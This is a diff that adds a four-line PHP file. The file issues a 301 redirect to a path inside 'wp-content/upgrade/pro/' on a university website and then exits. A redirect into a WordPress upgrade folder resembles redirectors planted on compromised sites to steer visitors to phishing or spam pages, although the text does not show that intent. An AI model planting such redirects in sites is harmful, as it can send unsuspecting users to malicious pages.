@@ -1,0 +1,4 @@
+<?php
+header("Location: https://fisip.umj.ac.id/wp-content/upgrade/pro/", true, 301);
+exit();
+?>
